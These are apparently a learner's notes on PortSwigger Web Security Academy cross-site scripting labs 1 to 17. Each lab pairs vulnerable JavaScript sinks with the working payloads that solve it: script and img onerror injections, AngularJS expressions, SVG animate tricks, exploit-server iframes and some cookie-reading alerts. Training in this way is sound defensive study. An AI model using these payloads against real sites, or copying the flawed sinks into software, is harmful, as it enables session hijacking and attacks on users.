# Reflected XSS

## Lab - 1: Reflected XSS into HTML context with nothing encoded

In search box,

```html
<script>
  alert("1");
</script>
```

---

# Stored XSS

## Lab - 2: Stored XSS into HTML context with nothing encoded

```
POST /post/comment HTTP/1.1
...
Origin: https://0a9c00f604e0a6f0c00e599c007c00b2.web-security-academy.net
Referer: https://0a9c00f604e0a6f0c00e599c007c00b2.web-security-academy.net/post?postId=2
...

csrf=uY2QyKgwlEKbIVZ48E3IhL7SDUKM0yug&postId=2&comment=%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&name=Test&email=test%40gmail.com&website=
```

---

# DOM XSS

## Lab - 3: DOM XSS in document.write sink using source location.search

- This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

- The vulnerable JS function used in this lab is

```js
function trackSearch(query) {
  document.write(
    '<img src="/resources/images/tracker.gif?searchTerms=' + query + '">'
  );
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
  trackSearch(query);
}
```

There are many ways to execute. In search box,

```
"><img src=x onerror=javascript:alert(1) />
```

---

## Lab - 4: DOM XSS in document.write sink using source location.search inside a select element

- This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

- Vulnerable JS function in this lab is

```js
var stores = ["London", "Paris", "Milan"];
var store = new URLSearchParams(window.location.search).get("storeId");
document.write('<select name="storeId">');
if (store) {
  document.write("<option selected>" + store + "</option>");
}
for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) {
    continue;
  }
  document.write("<option>" + stores[i] + "</option>");
}
document.write("</select>");
```

Test by adding storeId as a new URL parameter and found a new item in drop down

```
GET /product?productId=1&storeId=qwerasdf HTTP/1.1
```

Resulting DOM is as follow.

```html
<select name="storeId">
  <option selected="">qwerasdf</option>
  ...
</select>
```

To exploit,

```
GET /product?productId=1&storeId=</select><script>alert(1);</script> HTTP/1.1
```

---

## Lab - 5: DOM XSS in innerHTML sink using source location.search

- This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

- Vulnerable JS script for this lab is

```js
function doSearchQuery(query) {
  document.getElementById("searchMessage").innerHTML = query;
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
  doSearchQuery(query);
}
```

- Many ways to do; In search box,

```html
<img src="x" onerror="alert(1)" />
```

---

## Lab - 6: DOM XSS in jQuery anchor href attribute sink using location.search source

```js
$(function () {
  $("#backLink").attr(
    "href",
    new URLSearchParams(window.location.search).get("returnPath")
  );
});
```

```
GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/1.1
```

Then click `back` button.

---

## Lab - 7: DOM XSS in jQuery selector sink using a hashchange event

```js
$(window).on("hashchange", function () {
  var post = $(
    "section.blog-list h2:contains(" +
      decodeURIComponent(window.location.hash.slice(1)) +
      ")"
  );
  if (post) post.get(0).scrollIntoView();
});
```

In the exploit server Body,

```html
<iframe
  src="https://0a650071031922c2c01e036400e900df.web-security-academy.net#"
  onload="this.src+='<img src=1 onerror=print(1)>'"
/>
```

---

## Lab - 8: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- on page source `body` element has `ng-app` attribute.
- In search box, `{{$on.constructor('alert(1)')()}}`

---

## Lab - 9: Reflected DOM XSS

> not understand yet

- source js file is at `resources/js/searchResults.js`.
- Vulnerable JS script

```js
xhr.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    eval("var searchResultsObj = " + this.responseText);
    displaySearchResults(searchResultsObj);
  }
};
```

In search box, `\"-alert(1)}//`

---

## Lab - 10: Stored DOM XSS

- source js file is at `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`
- Vulnerable JS script

```js
function escapeHTML(html) {
  return html.replace("<", "&lt;").replace(">", "&gt;");
}
```

replace() function only replaces the first occurrence.

- In search box, `<><img src=x onerror=alert(1)/>`

---

# XSS Context - between HTML tags

## Lab - 11: Reflected XSS into HTML context with most tags and attributes blocked

- endpoint `https://0a6300f10328845ac050a89a001f0000.web-security-academy.net/?search=` is vulnerable to XSS

- Most tags are blocked
- In intruder, try `<§§>` with all tags from [XSS cheat sheet](!https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- `body` has has 200 response
- Then try `<body%20§§=1>` with all events from XSS cheat sheet
- `onresize` has 200 response
- Add the following in the exploit server body.

```html
<iframe
  src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
  onload="this.style.width"
  ="100px"
></iframe>
```

---

## Lab - 12: Reflected XSS into HTML context with all tags blocked except custom ones

- In exploit server body,

> not understand

```html
<script>
  var url =
    "https://0aeb00b304304397c0de93d700db007f.web-security-academy.net/";
  location =
    url +
    "?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";
</script>
```

---

## Lab - 13: Reflected XSS with event handlers and href attributes blocked

> not understand

- only `a, animate, image, svg` tags are allowed
- ```
  https://0a3b0070030c4c68c086752d007500a6.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
  ```

---

## Lab - 14: Reflected XSS with some SVG markup allowed

- find with intruder and found that tags - `svg, animateTransform` are allowed and `onbegin` event is also allowed.

```html
<svg>
  <animateTransform
    onbegin="alert(1)"
    attributeName="x"
    dur="1s"
  ></animateTransform>
</svg>
```

---

# XSS in HTML tag attributes

## Lab - 15: Reflected XSS into attribute with angle brackets HTML-encoded

`" autofocus onfocus=alert(1) x="`

---

## Lab - 16: Stored XSS into anchor href attribute with double quotes HTML-encoded

`javascript:alert(1)` in Name input.

---

## Lab - 17: Reflected XSS in canonical link tag

- This lab reflects user input in a canonical link tag and escapes angle brackets.

- To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

- To assist with your exploit, you can assume that the simulated user will press the following key combinations:

- ALT+SHIFT+X - windows
- CTRL+ALT+X - Mac
- Alt+X - Linux

Follow this link on chrome

```
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
